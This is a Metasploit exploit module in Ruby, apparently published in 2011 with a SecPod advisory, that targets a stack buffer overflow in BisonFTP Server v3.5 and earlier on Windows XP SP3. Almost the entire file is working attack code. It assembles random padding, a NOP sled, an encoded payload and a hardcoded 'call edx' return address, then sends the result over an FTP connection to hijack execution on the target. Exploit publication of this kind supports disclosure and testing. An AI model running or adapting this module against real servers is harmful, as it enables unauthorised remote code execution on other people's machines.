#
# Title    : BisonFTP Server Remote Buffer Overflow Exploit
# Author   : Veerendra G.G SecPod Technologies (www.secpod.com)
# Advisory : http://secpod.org/blog/?p=384
#            http://secpod.org/msf/bison_server_bof.rb
# Version  : BisonFTP Server <= v3.5
# Date     : 09/07/2011
#
###############################################################################
 
##
# $Id: bison_server_bof.rb 2011-08-19 03:13:45Z veerendragg $
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::Remote::Ftp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;BisonFTP Server Remote Buffer Overflow Vulnerability&#039;,
            &#039;Description&#039;    => %q{
                        This module exploits a buffer overflow vulnerability
                        found in the BisonFTP Server <= v3.5.
            },
            &#039;Author&#039;         =>
                [
                    &#039;localh0t&#039;,     # Initial PoC
                    &#039;veerendragg @ SecPod&#039;, # Metasploit Module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 1.0 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;BID&#039;, &#039;49109&#039;],
                    [ &#039;CVE&#039;, &#039;1999-1510&#039;],
                    [ &#039;URL&#039;, &#039;http://secpod.org/blog/?p=384&#039;],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/17649&#039;],
                    [ &#039;URL&#039;, &#039;http://secpod.org/msf/bison_server_bof.rb&#039;],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039; => 388,
                    &#039;BadChars&#039; => "\x00\x0a\x0d",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows XP SP3 EN&#039;,
                        {
                            &#039;Ret&#039; => 0x0040333f, # call edx from Bisonftp.exe
                            &#039;Offset&#039; => 1432
                        }
                    ],
                ],
            &#039;DisclosureDate&#039; => &#039;Aug 07 2011&#039;,
            &#039;DefaultTarget&#039; => 0))
    end
 
    def exploit
        connect
 
        print_status("Trying target #{target.name}...")
        print_status("Connected to #{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}")
        sploit = rand_text_alpha(1028)                  ## Random Buffer
        sploit << "\x90" * 16                     ## Padding
        sploit << payload.encoded                 ## Encoded Payload
        sploit << "\x90" * (388 - payload.encoded.length)     ## More Nops
        sploit << [target.ret].pack(&#039;V&#039;)              ## Return Address
        sploit << rand_text_alpha(39)                 ## MOre Buffer
 
        print_status("Sending payload...")
        sock.put(sploit)
 
        handler
        disconnect
    end
 
end



